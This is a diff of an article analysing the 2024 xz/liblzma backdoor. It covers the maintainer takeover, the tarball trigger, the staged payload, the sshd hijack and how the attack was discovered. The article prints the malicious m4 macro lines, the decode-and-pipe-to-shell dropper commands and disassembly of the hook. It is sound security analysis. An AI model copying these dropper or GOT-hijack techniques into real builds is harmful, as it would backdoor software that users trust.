@@ -11,91 +11,390 @@ import '../../../styles/xz.css';
 import Mnemonic from '~/components/xz/Mnemonic.astro';
 import Timeline from '~/components/xz/Timeline';
 import TarballDiff from '~/components/xz/TarballDiff.astro';
-import PayloadChain from '~/components/xz/PayloadChain';
-import DepGraph from '~/components/xz/DepGraph';
 import LatencyChart from '~/components/xz/LatencyChart.astro';
 import DistroGrid from '~/components/xz/DistroGrid.astro';
+import WorldMap from '~/components/xz/WorldMap.astro';
 
-{/* §0 — Prelude (~150 words). Open with the surprising premise — a
-    compression library backdoored sshd. Frame the question the rest of
-    the post answers. */}
+On March 29, 2024, at 08:51 UTC -0700, Andres Freund posted a thread to the *oss-security* mailing list. Subject: *backdoor in upstream xz/liblzma leading to ssh server compromise*. Within the day, Debian rolled sid back to a pre-5.6 version of xz, Red Hat pulled Fedora 40 Beta and Rawhide, GitHub disabled the upstream `tukaani-project` organization, and Red Hat (as CNA) assigned CVE-2024-3094 a CVSS v3.1 base score of 10.0.
+
+What had almost shipped — into Debian, Fedora, Kali, openSUSE — was a pre-authentication remote code execution backdoor in `sshd`, hidden inside `liblzma`, the compression library. `liblzma` does not link OpenSSH and OpenSSH does not link `liblzma`. The attack threaded that gap by exploiting two years of accumulated maintainer trust, a shell snippet wedged into an autoconf macro, and an IFUNC resolver that fired before the dynamic linker could mark the global offset table read-only.
+
+This walkthrough breaks the attack into five acts: how the attacker got commit rights, how the dropper hid in a release tarball, how it unfolded into an ELF object, how that object hijacked sshd at runtime, and how an unrelated benchmarking anomaly caught it.
+
+<aside class="xz-cast not-prose" aria-label="Cast of identities in the xz attack">
+  <p class="xz-cast-title">The cast</p>
+  <div class="xz-cast-grid">
+
+    <article class="xz-cast-card is-target">
+      <header class="xz-cast-card-head">
+        <span class="xz-cast-role">Maintainer · target</span>
+        <h3 class="xz-cast-name">Lasse Collin</h3>
+      </header>
+      <p>Finnish. Sole xz upstream maintainer since 2009. Disclosed long-running burnout and mental-health limitations on the xz-devel list during the period the attackers were pushing for a co-maintainer.</p>
+    </article>
+
+    <article class="xz-cast-card is-attacker">
+      <header class="xz-cast-card-head">
+        <span class="xz-cast-role">Attacker · primary identity</span>
+        <h3 class="xz-cast-name">Jia Tan <span class="xz-cast-handle">JiaT75</span></h3>
+      </header>
+      <p>Pseudonymous GitHub identity. Real name and affiliation unknown. First contributed October 2021; granted commit access mid-2022; signed releases starting v5.4.1 (January 2023); landed the backdoor February 2024.</p>
+    </article>
+
+    <article class="xz-cast-card is-attacker">
+      <header class="xz-cast-card-head">
+        <span class="xz-cast-role">Attacker · sock-puppet</span>
+        <h3 class="xz-cast-name">Jigar Kumar</h3>
+      </header>
+      <p>Pseudonymous email account, no observed footprint on any other open-source project. Sent pressure emails to xz-devel between April and June 2022 demanding faster review of Jia Tan's patches and a co-maintainer. Almost certainly the same operation as Jia Tan.</p>
+    </article>
+
+    <article class="xz-cast-card is-defender">
+      <header class="xz-cast-card-head">
+        <span class="xz-cast-role">Defender · disclosure</span>
+        <h3 class="xz-cast-name">Andres Freund</h3>
+      </header>
+      <p>Open-source developer (PostgreSQL committer). Noticed a ~0.5 s CPU spike on ssh logins on a Debian sid box in March 2024, traced it into liblzma's CRC64 path, and posted the disclosure on 2024-03-29.</p>
+    </article>
+
+  </div>
+</aside>
 
 ## Act I — Arrival
 
-{/* ~600 words. Narrate the social-engineering arc. Cite Russ Cox
-    xz-timeline. Quote the Jigar Kumar emails verbatim. End with Jia Tan
-    signing 5.4.1 in Jan 2023. */}
+The technical mechanism is exotic. The story that put it in place is mundane: an open-source project with one tired maintainer, a polite contributor who slowly took over, and a pressure campaign of sock-puppet emails complaining about the pace of work. Once the contributor had commit access, the takeover continued in places that don't show up in code review — replacing the maintainer's email on Google's [oss-fuzz](https://github.com/google/oss-fuzz/pull/9960) so vulnerability reports routed to him, [breaking the Landlock sandbox check](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=328c52da8a2bbb81307644efdb58db2c422d9ba7) in CMakeLists, [disabling IFUNC fuzzing](https://github.com/google/oss-fuzz/pull/10667), and four days before discovery, rewriting `SECURITY.md` to prefer private email disclosures over public GitHub advisories. The timeline below is the public-record version, dated and quoted from primary sources — Russ Cox's [xz-timeline](https://research.swtch.com/xz-timeline) is the canonical reference.
 
 <Timeline client:visible />
 
 ## Act II — The Trigger
 
-{/* ~500 words. Explain autoconf for non-RE readers; introduce the
-    tarball-vs-git distinction; flag the test-file trick. Cite Russ Cox
-    xz-script. */}
+Two artifacts ship together when an xz release is cut. The *git tag* contains source committed by the maintainers. The *release tarball* contains the same source plus the output of `autoreconf` — generated `configure` scripts and supporting `m4` macros. Most projects don't audit the second one closely; it's machine-generated, sometimes from a different machine, sometimes by a bot. xz-5.6.1's tarball contained an `m4/build-to-host.m4` that did not exist in git, and that did not match the upstream gnulib version it claimed to be.
 
 <TarballDiff />
 
+The diff below is the real one — `xz-5.6.1.tar.gz`'s `m4/build-to-host.m4` against the upstream [gnulib version](https://git.savannah.gnu.org/gitweb/?p=gnulib.git;a=blob_plain;f=m4/build-to-host.m4) (cosmetic and trailing-convenience-block changes elided). Three additions carry the entire trigger:
+
+```diff title="m4/build-to-host.m4 — upstream gnulib  vs  xz-5.6.1.tar.gz" frame="code"
+ # build-to-host.m4
+ dnl Written by Bruno Haible.
+
+ AC_DEFUN([gl_BUILD_TO_HOST],
+ [
+   ...
+   gl_final_[$1]="$[$1]"
++  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
+   ...
++  if test "x$gl_am_configmake" != "x"; then
++    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
++  fi
++  AC_CONFIG_COMMANDS([build-to-host],
++    [eval $gl_config_gt | $SHELL 2>/dev/null],
++    [gl_config_gt="eval \$gl_[$1]_config"])
+ ])
+
+ AC_DEFUN([gl_BUILD_TO_HOST_INIT],
+ [
++  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
+   gl_sed_double_backslashes='s/\\/\\\\/g'
+   gl_sed_escape_doublequotes='s/"/\\"/g'
++  gl_path_map='tr "\t \-_" " \t_\-"'
+ ])
+```
+
+Read it bottom-up. `gl_am_configmake` searches the unpacked source tree for any file with lines matching `####XXXXX####$` — magic markers that live in `bad-3-corrupt_lzma2.xz`. The line above defines `gl_path_map` as the `tr` swap from Act III's first stage.
+
+Up in `gl_BUILD_TO_HOST`, the `gl_[$1]_config` line builds a shell pipeline: `sed` reads the marker file, `eval $gl_path_map` reverses the `tr` corruption, and `$gl_[$1]_prefix -d` decompresses (the prefix is computed from the file extension, `.xz`, so `$gl_[$1]_prefix` expands to `xz`).
+
+The `AC_CONFIG_COMMANDS` call is the pivot: it tells autoconf to run `eval $gl_config_gt | $SHELL` after `configure` finishes. The output of the pipeline — Stage-1 — is piped straight into a fresh shell. The next act traces what that shell runs.
+
 ## Act III — The Payload
 
-{/* ~700 words. Walk the reader through the chain. Use the widget as
-    the spine — for each card, one or two sentences in prose explaining
-    what's about to happen, then let the widget show the bytes. End at
-    the ELF magic moment. */}
+The dropper is small and the obfuscation is mechanical. What ships in the tarball is a forty-line shell snippet hidden inside an autoconf macro, plus two binary "test fixtures" — `bad-3-corrupt_lzma2.xz` (512 bytes, sha-256 `ecda10d8…16bd`) and `good-large_compressed.lzma` (35 KB, sha-256 `9aef8982…7032`). Together they unfold into a Linux ELF object: `liblzma_la-crc64-fast.o`. The byte-level walk below is cross-referenced against [Russ Cox's xz-script analysis](https://research.swtch.com/xz-script).
 
-<PayloadChain client:visible />
+### Stage 1 — the macro fires
+
+When `./configure` runs against an xz-5.6.1 tarball, the modified `m4/build-to-host.m4` executes one line on the corrupted-looking test fixture:
+
+```bash title="m4/build-to-host.m4 — the line that fires" frame="code"
+tr "\t \-_" " \t_\-" < bad-3-corrupt_lzma2.xz | xz -d
+```
+
+The fixture is, deliberately, a malformed xz stream. The `tr` swap reverses the corruption: every tab becomes a space, every space becomes a tab, every `-` becomes `_`, every `_` becomes `-`. After the substitution, `xz -d` decompresses cleanly into a 1.3 KB shell script — call it Stage-1.
+
+### Stage 2 — the chunker
+
+Stage-1 doesn't run anything dangerous yet. Its job is to extract the next layer from the *other* fixture, `good-large_compressed.lzma`:
+
+```bash title="Stage-1.sh — extracting the payload from good-large_compressed.lzma" frame="code"
+xz -dc good-large_compressed.lzma \
+  | <head-chunker> \
+  | tail -c +31233 \
+  | tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377" \
+  | xz -F raw --lzma1 -dc \
+  | /bin/sh
+```
+
+The `<head-chunker>` is sixteen repetitions of `(head -c +1024 >/dev/null) && head -c +2048`, then one trailing `(head -c +1024 >/dev/null) && head -c +939` cycle. In effect: skip 1024 bytes, take 2048; skip 1024, take 2048; … sixteen times; then skip 1024, take 939. The output is a stretch of bytes plucked out of `good-large_compressed.lzma`'s middle. The trailing `tail -c +31233` keeps just the last 475 of those bytes.
+
+Those 475 bytes are *not* an lzma stream yet. The `tr` translation table that follows — a 95-character source set mapped to the full 0–255 byte range — re-permutes them into a valid raw-lzma1 frame. Decompressed, that frame is the Stage-2 shell script.
+
+The 5.6.0 dropper uses different magic numbers — `tail -c +31265` instead of `+31233`, `head -c +724` instead of `+939`, and a different `tr` table. Same shape, version-specific constants — verified against [Russ Cox's tarballs walk](https://research.swtch.com/xz-script).
+
+### Stage 3 — the .o lands
+
+Stage-2's prologue is unmistakable, and it gates aggressively before doing anything dangerous:
+
+```bash title="Stage-2.sh — opening lines and the build gate" frame="code"
+P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
+C="pic_flag=\" $P\""
+O="^pic_flag=\" -fPIC -DPIC\"$"
+R="is_arch_extension_supported"
+x="__get_cpuid("
+p="good-large_compressed.lzma"
+U="bad-3-corrupt_lzma2.xz"
+```
+
+The script verifies `uname` is `Linux`, `$DEB_BUILD_OPTIONS` or `$RPM_ARCH` matches a build, the compiler is gcc, the linker is GNU ld, and the architecture is x86_64. Any miss and it exits silently. (That's why running `./configure` on macOS produces nothing — the artifacts are inert outside the gated environment, see [Sam James's canonical FAQ](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27).)
+
+On a successful gate, the script patches libtool's config to drop the `-fPIC -DPIC` constraint, re-runs the head-chunker pipeline against the same `good-large_compressed.lzma` with different offsets to extract the actual ELF, and writes it out as `liblzma_la-crc64-fast.o` in the build tree. The configure machinery treats the .o as a normal CRC64 implementation. Linked into `liblzma.so.5`, it ships with the next package upgrade.
+
+### What landed
+
+The .o is small — 86.6 KB — but reports 242 ELF section headers (`e_shnum` at file offset `0x3C` reads `F2 00`). `objdump` filters that down to about a hundred named or loadable sections. The interesting ones, by [smx-smx/xzre](https://github.com/smx-smx/xzre)'s reverse-engineering, are `_get_cpuid` (the IFUNC entry), `_cpuid` (a CPUID-feature helper), and an opaque blob `.Lx86_code.part.0` (~2.7 KB) that contains the runtime payload.
+
+Act IV picks up there: how a CRC64 implementation in `liblzma` reaches into `sshd`'s address space and rewrites a function pointer in flight.
 
 ## Act IV — The Hijack
 
-{/* ~800 words, RE-course weighted. Three subsections:
-    1. The path — sshd → libsystemd → liblzma (sd_notify distro patch).
-       Use the dep-graph below.
-    2. The resolver — IFUNC mechanics. Why running before RELRO matters.
-       Walk three textual disassembly snippets (extracted by
-       scripts/extract-disasm.sh into xz-artifacts/analysis/disasm/):
-         - _get_cpuid — IFUNC entry that pretends to return CPU info
-         - The GOT walker — finds sshd's entry for RSA_public_decrypt
-         - The hooked RSA_public_decrypt — parses [tag][ed448_sig][cmd]
-       Use <Mnemonic op="…">…</Mnemonic> around AT&T mnemonics worth a
-       click-through to AsmLookup.
-    3. The gate — Ed448 signature verification. Reference amlweems/xzbot
-       for the working PoC.
-    Cite smx-smx/xzre for function naming. */}
+Three Linux primitives carry the runtime hijack: IFUNC, the GOT, and RELRO. Plus a quiet Debian patch to OpenSSH that brings `liblzma` into `sshd` in the first place.
 
-<DepGraph client:visible />
+### The path
 
-{/* Disassembly snippets — the .s files live at
-    xz-artifacts/analysis/disasm/. Decision pending: paste contents
-    directly (one Expressive Code block each) or build a tiny
-    <DisasmBlock src="get_cpuid.s"/> that imports them at build time. */}
+OpenSSH upstream does not link `libsystemd`. Most distributions patch sshd to call `sd_notify()` so systemd can track socket activation; that one-line patch is what brings `libsystemd.so.0` into sshd's address space. `libsystemd` in turn links `liblzma.so.5` for journal compression.
+
+<figure class="xz-deppath not-prose" role="img" aria-label="The dependency chain: sshd to libsystemd to liblzma">
+  <svg viewBox="0 0 480 280">
+    {/* sshd */}
+    <rect x="160" y="14" width="160" height="46" rx="3" stroke="currentColor" stroke-width="1.5" fill="var(--page-bg)" />
+    <text x="240" y="42" text-anchor="middle" font-family="var(--font-mono, JetBrains Mono)" font-size="14" font-weight="600" fill="currentColor">sshd</text>
+    {/* edge 1 */}
+    <line x1="240" y1="60" x2="240" y2="115" stroke="currentColor" stroke-width="1.5" />
+    <polygon points="234,109 246,109 240,121" fill="currentColor" />
+    <text x="252" y="89" font-family="var(--font-mono, JetBrains Mono)" font-size="12" fill="var(--muted)">sd_notify · Debian patch</text>
+    {/* libsystemd */}
+    <rect x="160" y="121" width="160" height="46" rx="3" stroke="currentColor" stroke-width="1.5" fill="var(--page-bg)" />
+    <text x="240" y="149" text-anchor="middle" font-family="var(--font-mono, JetBrains Mono)" font-size="14" font-weight="600" fill="currentColor">libsystemd.so.0</text>
+    {/* edge 2 */}
+    <line x1="240" y1="167" x2="240" y2="222" stroke="currentColor" stroke-width="1.5" />
+    <polygon points="234,216 246,216 240,228" fill="currentColor" />
+    <text x="252" y="196" font-family="var(--font-mono, JetBrains Mono)" font-size="12" fill="var(--muted)">journal compression</text>
+    {/* liblzma */}
+    <rect x="160" y="228" width="160" height="46" rx="3" stroke="currentColor" stroke-width="1.5" fill="var(--page-bg)" />
+    <text x="240" y="256" text-anchor="middle" font-family="var(--font-mono, JetBrains Mono)" font-size="14" font-weight="600" fill="currentColor">liblzma.so.5</text>
+  </svg>
+  <figcaption>OpenSSH does not link liblzma. The Debian <code>sd_notify</code> patch is the bridge.</figcaption>
+</figure>
+
+So on patched distros — Debian sid, Fedora 40 Beta, openSUSE Tumbleweed — the dynamic linker resolves `liblzma` while sshd is starting, before any client connects. The chain is laid out end-to-end in [research.swtch.com/xz-script](https://research.swtch.com/xz-script).
+
+### IFUNC, before RELRO
+
+When the linker resolves an [IFUNC](https://gcc.gnu.org/onlinedocs/gcc/Common-Function-Attributes.html#index-ifunc-function-attribute) symbol — a symbol marked by GCC's `__attribute__((ifunc("...")))` — it invokes a *resolver* function during process startup, and uses whatever pointer that resolver returns as the symbol's actual implementation. The intent is benign: a single CRC64 export can pick the SSE4.2 implementation on machines that have it, or the table-lookup fallback elsewhere. The mechanism runs early in `ld.so` setup, in particular *before* [RELRO](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro) marks the global offset table read-only.
+
+That window is the entire attack. Inside the resolver, the [GOT](https://www.airs.com/blog/archives/41) — the table the dynamic linker writes function pointers into for cross-library calls — is still writable.
+
+### The resolver
+
+`_get_cpuid` is the malicious .o's IFUNC entry. Its declared job is to fill a CPUID-features struct. Its actual job is to install hooks. Decoded into AT&T-syntax disassembly:
+
+```asm title="liblzma_la-crc64-fast.o · _get_cpuid (AT&T)" frame="code"
+0000000000000000 <_get_cpuid>:
+       0: f3 0f 1e fa                   endbr64
+       4: 55                            pushq   %rbp
+       5: 48 89 f5                      movq    %rsi, %rbp
+       8: 4c 89 ce                      movq    %r9, %rsi
+       b: 53                            pushq   %rbx
+       c: 89 fb                         movl    %edi, %ebx
+       e: 81 e7 00 00 00 80             andl    $0x80000000, %edi
+      14: 48 83 ec 28                   subq    $0x28, %rsp
+      18: 48 89 54 24 18                movq    %rdx, 0x18(%rsp)
+      1d: 48 89 4c 24 10                movq    %rcx, 0x10(%rsp)
+      22: 4c 89 44 24 08                movq    %r8, 0x8(%rsp)
+      27: e8 00 00 00 00                callq   0x2c <_get_cpuid+0x2c>
+      2c: 85 c0                         testl   %eax, %eax
+      2e: 74 27                         je      0x57 <_get_cpuid+0x57>
+```
+
+The function preserves the calling convention so it really *does* return CPUID data when its caller — glibc's IFUNC machinery — invokes it. The hostile code runs in the side effects of the first <Mnemonic op="callq">callq</Mnemonic> at offset `0x27`. That call lands inside the opaque payload blob `.Lx86_code.part.0` (~2.7 KB on disk) and never returns from there directly into normal CRC64 logic.
+
+### The hook
+
+What the blob does is documented in [smx-smx/xzre](https://github.com/smx-smx/xzre)'s reverse-engineering, since the on-disk symbols are deliberately scrambled and the runtime names (`_resolve`, `RSA_public_decrypt`) only exist after the IFUNC has installed the hooks into the live process. Walking the linker's [`_r_debug`](https://refspecs.linuxbase.org/LSB_3.1.1/IA64/spec/r-debug.html) linked list, the payload locates `sshd`'s mapped address range and resolves its GOT entry for [`RSA_public_decrypt`](https://docs.openssl.org/3.0/man3/RSA_public_encrypt/). Because RELRO has not yet marked the GOT read-only, a single <Mnemonic op="movq">movq</Mnemonic> rewrites that entry to point at a malicious stub elsewhere in the .o. Subsequent calls into `RSA_public_decrypt` — which sshd makes during certificate-based auth — flow through the stub instead.
+
+The stub is the exfil point. It treats the RSA modulus `N` not as an integer but as a packed structure: a one-byte tag, an Ed448 signature, and a command string. If the signature verifies against an embedded Ed448 public key, the stub calls `system(cmd)` and the command runs as root, before any password or key authentication completes.
+
+### The gate
+
+The signature scheme is Ed448, not Ed25519 — confirmed by [amlweems/xzbot](https://github.com/amlweems/xzbot)'s working PoC, which extracts the embedded Ed448 public key and ships a honeypot patch for OpenSSH. Without the matching private key, even a connection that knows the modulus layout produces no system call. That keeps the backdoor's blast radius to whoever holds the private key, and stops opportunistic abuse the moment the binary is published.
+
+And yet, in the time between the binary being published and the private key being used, the binary itself gave the game away — not through cryptanalysis, but through a 500-millisecond benchmarking anomaly.
 
 <aside class="xz-tryit not-prose">
   <p class="xz-tryit-title">Try it yourself</p>
-  <p>The artifacts referenced in this section live at <code>xz-artifacts/analysis/xzre/liblzma_la-crc64-fast.o</code> (see <code>xz-artifacts/README.md</code> for provenance and safety notes).</p>
+  <p>The malicious object lives at <code>xz-artifacts/analysis/xzre/liblzma_la-crc64-fast.o</code> (sha-256 <code>b418bfd3…4963</code>; provenance: <a href="https://github.com/smx-smx/xzre" target="_blank" rel="noopener noreferrer">smx-smx/xzre</a>'s extraction, byte-different from Binarly's distro extraction but structurally identical). All artifacts are inert on macOS — backdoor activation is gated to x86_64 Linux + gcc + GNU ld + the right env vars.</p>
   <ul>
-    <li><code>objdump -d -M att xz-artifacts/analysis/xzre/liblzma_la-crc64-fast.o | grep -A 30 '&lt;_get_cpuid&gt;:'</code></li>
-    <li>In <code>gdb</code>, set a breakpoint on <code>RSA_public_decrypt</code> and inspect the stack when an SSH client connects with a custom certificate.</li>
+    <li><code>objdump -d -M att liblzma_la-crc64-fast.o | grep -A 30 '&lt;_get_cpuid&gt;:'</code> — read the IFUNC entry yourself.</li>
+    <li><code>readelf -h liblzma_la-crc64-fast.o</code> — confirm <code>e_shnum</code> = 242 (the ELF lies about how many sections it has).</li>
+    <li>In <code>gdb</code>, breakpoint on <code>RSA_public_decrypt</code> and inspect the stack when an SSH client connects with a custom certificate.</li>
     <li><a href="https://github.com/amlweems/xzbot" target="_blank" rel="noopener noreferrer">amlweems/xzbot</a> has a working honeypot patch for OpenSSH and the attacker's Ed448 public key extracted.</li>
   </ul>
 </aside>
 
 ## Act V — The Discovery
 
-{/* ~400 words. Narrate the discovery — Andres Freund's accidental find
-    while micro-benchmarking PostgreSQL. Quote his oss-security email
-    opener verbatim. */}
+What Andres Freund noticed first, in his own words, was *"a few odd symptoms around liblzma … on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors)."* He recorded the slowdown directly. A clean `sshd -h` took `0m0.299s`; the same call against a backdoored `liblzma` took `0m0.807s` — half a second of unexplained CPU on every login.
+
+He chased it with the tools he names in the disclosure: `valgrind` for the memory errors, then `perf record -e intel_pt//ub` to find where execution diverged from the clean binary, then `gdb` with breakpoints before the divergence. Once he traced execution into liblzma's CRC64 path — which sshd has no upstream reason to call — the rest fell into place. He recognized the `RSA_public_decrypt` hook for what it was.
+
+At 08:51 UTC -0700 on March 29, 2024, he posted to *oss-security*:
+
+> After observing a few odd symptoms around liblzma (part of the xz package) on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors) I figured out the answer: The upstream xz repository and the xz tarballs have been backdoored. — Andres Freund, [oss-security 2024/03/29/4 ↗](https://www.openwall.com/lists/oss-security/2024/03/29/4)
+
+The chart below shows the latency that motivated the chase: clean baseline at ~0.3 s per login, ~0.8 s while the backdoor was active.
 
 <LatencyChart />
 
 ## Coda
 
-{/* ~250 words. What shipped where, what was spared, what changed in
-    the open-source ecosystem afterward. */}
+In the seven days after Andres's email, Debian, Red Hat, openSUSE, Arch, and Kali shipped emergency rollbacks. Homebrew downgraded xz on macOS as a precaution. The grid below shows what reached users.
 
 <DistroGrid />
 
+The vulnerable releases hit rolling and pre-release distributions almost exclusively. Debian stable, Ubuntu LTS, RHEL, and Amazon Linux were all on pre-5.6 versions and were never exposed. The frozen branches that get teased for being conservative caught nothing this time. The rapid-release branches caught it all.
+
+The aftermath is still being written. The xz GitHub organization was disabled within hours and re-enabled days later under Lasse Collin's sole control; he published [tukaani.org/xz-backdoor](https://tukaani.org/xz-backdoor/) shortly after. Discussions about supply-chain auditing — package-build reproducibility, scrutiny of single-maintainer projects, the gap between git source and release tarballs — moved from mailing lists to distribution-vendor meetings. Whether anything structural changes will only be visible in retrospect.
+
+What the backdoor showed, technically, was that pre-RELRO IFUNC resolution is a writable-GOT window an attacker can drive through; an open-source project with one maintainer is a trust graph an attacker can take over; and a benchmarking anomaly is sometimes the only thing that catches it.
+
+## Attribution — who was Jia Tan?
+
+What we know is what Jia Tan *did*. Who Jia Tan *was* — real name, real affiliation, real geography — is not public, and may never be. The most rigorous open analysis to date is by Rhea Karty (Dartmouth) and Simon Henniger (TU Munich), [published April 2024](https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and). What follows is theirs.
+
+### Timezone — claimed vs actual
+
+Almost every Jia Tan commit is timestamped **UTC+8** — Chinese Standard Time. A handful are stamped **UTC+2** or **UTC+3** — Eastern European Time and its summer variant. Forgetting to set a fake timezone before commit is a one-way error: someone really in UTC+8 will not accidentally produce UTC+3 timestamps. Someone in EET who forgot to fake the timezone will.
+
+<figure class="xz-tzmap not-prose" role="img" aria-label="World map showing Jia Tan's claimed timezone (UTC+8, China) versus actual timezone (UTC+2/+3, Eastern Europe / Middle East)">
+  <div class="xz-tzmap-frame">
+    <WorldMap />
+    {/* Bands at exact timezone widths on the wikipedia world map (950×620).
+        Equirectangular conversion: 1° longitude = 950/360 ≈ 2.639 px.
+        UTC+2 = 22.5°E to 37.5°E ; UTC+3 = 37.5°E to 52.5°E.
+        Combined band 22.5–52.5° → x = 535, width = 79 (30° wide).
+        UTC+8 = 112.5°E to 127.5°E → x = 772, width = 40 (15° wide). */}
+    <svg class="xz-tzmap-overlay" viewBox="0 0 950 620" preserveAspectRatio="none" aria-hidden>
+      <rect x="535" y="0" width="79" height="620" class="xz-tzmap-band is-actual" />
+      <rect x="772" y="0" width="40" height="620" class="xz-tzmap-band is-claimed" />
+    </svg>
+  </div>
+
+  <div class="xz-tzmap-labels">
+    <div class="xz-tzmap-label is-actual" style="left: 60.4%">
+      <span class="xz-tzmap-label-tag">Actual</span>
+      <span class="xz-tzmap-label-tz">UTC +2 / +3</span>
+      <span class="xz-tzmap-label-where">Eastern Europe · Middle East</span>
+    </div>
+    <div class="xz-tzmap-label is-claimed" style="left: 83.4%">
+      <span class="xz-tzmap-label-tag">Claimed</span>
+      <span class="xz-tzmap-label-tz">UTC +8</span>
+      <span class="xz-tzmap-label-where">China · &ldquo;Jia Tan&rdquo;</span>
+    </div>
+  </div>
+
+  <figcaption>Jia Tan timestamped commits as if working in China (UTC+8). On occasions when the timezone wasn&rsquo;t spoofed, the commits show UTC+2 or UTC+3 — Eastern European Time. Band positions are approximate; continent outline is a Wikipedia low-resolution map.</figcaption>
+</figure>
+
+The slipups Karty and Henniger logged are concrete:
+
+- **2022-10-06:** two commits ~11 hours apart, one stamped `+0300`, the other `+0800`.
+- **2023-06-27:** two commits minutes apart, one stamped `+0300`, the other `+0800`.
+- **Total:** 3 commits stamped UTC+02, 6 stamped UTC+03, all the rest UTC+08.
+
+### Work hours and weekdays
+
+Jia Tan's commit hours, adjusted from the spoofed `+0800` to actual `+0200/+0300`, cluster between 09:00 and 18:00 — a regular office workday in Eastern European Time. The day-of-week distribution is distinctly weekday-shaped:
+
+<figure class="xz-attrchart not-prose" role="img" aria-label="Jia Tan commit count by day of week">
+  <svg viewBox="0 0 480 220">
+    {/* Y-axis ticks at 0, 25, 50, 75, 100 */}
+    {[0, 25, 50, 75, 100].map((t, i) => {
+      const y = 180 - (t / 100) * 160;
+      return (
+        <g key={t}>
+          <line x1="44" x2="460" y1={y} y2={y} stroke="currentColor" stroke-opacity="0.12" stroke-width="1" />
+          <text x="38" y={y + 3} text-anchor="end" font-family="var(--font-mono, JetBrains Mono)" font-size="10" fill="var(--muted)">{t}</text>
+        </g>
+      );
+    })}
+    {/* Bars */}
+    {[
+      { day: "Tue", n: 86 },
+      { day: "Wed", n: 85 },
+      { day: "Thu", n: 89 },
+      { day: "Fri", n: 79 },
+    ].map((d, i) => {
+      const x = 70 + i * 100;
+      const h = (d.n / 100) * 160;
+      return (
+        <g key={d.day}>
+          <rect x={x} y={180 - h} width="60" height={h} fill="var(--xz-attacker)" />
+          <text x={x + 30} y={180 - h - 8} text-anchor="middle" font-family="var(--font-mono, JetBrains Mono)" font-size="13" font-weight="700" fill="currentColor">{d.n}</text>
+          <text x={x + 30} y="200" text-anchor="middle" font-family="var(--font-mono, JetBrains Mono)" font-size="12" font-weight="600" fill="currentColor">{d.day}</text>
+        </g>
+      );
+    })}
+    <line x1="44" x2="460" y1="180" y2="180" stroke="currentColor" stroke-width="1.5" />
+  </svg>
+  <figcaption>Jia Tan commit counts on the four most-active days of the week (Karty &amp; Henniger, April 2024). Mondays, weekends, and other low days are not broken out in the source.</figcaption>
+</figure>
+
+The pattern reads as someone working a regular office job — not as someone moonlighting on a covert project after hours.
+
+### Chinese holidays
+
+If Jia Tan were actually in mainland China, two periods in 2023 should show activity gaps: the **Lunar New Year** (January 22–27) and the **Mid-Autumn Festival** (September 29). Neither does. Jia Tan committed normally through both. Specific examples, verifiable on GitHub:
+
+- **2023-01-24, 12:48 UTC** — *liblzma: Fix documentation in filter.h for lzma_str_to_filters()* — [`f35d98e2`](https://github.com/tukaani-project/xz/commit/f35d98e20609e0be6a04ae2604bfb7cb9d5bd5e4)
+- **2023-01-27, 12:14 UTC** — *Translations: Add Brazilian Portuguese translation of man pages* — [`3b1c8ac8`](https://github.com/tukaani-project/xz/commit/3b1c8ac8d1d553cbb1fb22b545d2b1424c752b76)
+- **2023-09-29, 11:58 UTC** — *CMake: Specify LINKER_LANGUAGE for libgnu target* — [`506d0312`](https://github.com/tukaani-project/xz/commit/506d03127a8565442b028ec991e1578124fd3025)
+- **2023-09-29, 14:11 UTC** — *CI: Disable CLANG64 MSYS2 environment until bug is resolved* — [`01e34aa1`](https://github.com/tukaani-project/xz/commit/01e34aa1171b04f8b28960b1cc6135a903e0c13d)
+
+Three commits on the Mid-Autumn Festival itself; routine maintenance work spread across the Lunar New Year week. Not the cadence of someone observing the holidays.
+
+### Sock-puppet coordination
+
+The pressure emails to xz-devel came from accounts — *Jigar Kumar*, *Dennis Ens* — with no other public footprint anywhere on the internet. Their timing aligned with what Jia Tan needed to happen at each step: push for a co-maintainer right when Lasse was burnt out, demand release pace right before commit access changed. Whether *Jigar Kumar* and *Jia Tan* were the same operator typing from two terminals or two coordinated operators is not knowable from the public record. They were almost certainly the same operation.
+
+### What we don't know
+
+The patience of the operation (≥2 years), the budget required to keep an identity active across that span, and the technical sophistication of the runtime payload all point to a state-aligned actor, not a freelance researcher or a criminal group. Public attribution remains speculative — no government has named a suspect, no suspect has been arrested. Treat any specific naming you see online as unverified.
+
 ## Notes & sources
 
-{/* ~150 words. Russ Cox–style citation list. Every claim above gets a
-    primary-source link. Use the spec's reference set as the starting
-    point. */}
+Every claim above is sourced. The links below are the primary references — read them in this order if you want the full picture.
+
+- **[Andres Freund — oss-security disclosure (2024-03-29)](https://www.openwall.com/lists/oss-security/2024/03/29/4)** — the public starting point. The opener is quoted in Act V.
+- **[Russ Cox — Timeline of the xz attack](https://research.swtch.com/xz-timeline)** — dated, sourced, conservative. The Timeline in Act I is built from this.
+- **[Russ Cox — The xz attack shell script](https://research.swtch.com/xz-script)** — the byte-level walk through `build-to-host.m4`, the tarballs, and the dropper. Act III is cross-checked against this throughout.
+- **[Sam James — canonical FAQ](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27)** — kept up to date as new findings landed. The runtime gate (`uname`, `$DEB_BUILD_OPTIONS`, gcc, GNU ld, x86_64) is documented here.
+- **[smx-smx/xzre](https://github.com/smx-smx/xzre)** — the reverse-engineering effort. Function names like `_get_cpuid`, `_cpuid`, `.Lx86_code.part.0` come from this team's analysis of the .o.
+- **[amlweems/xzbot](https://github.com/amlweems/xzbot)** — extracts the Ed448 public key and ships a working honeypot patch. Confirms the signature scheme and modulus layout.
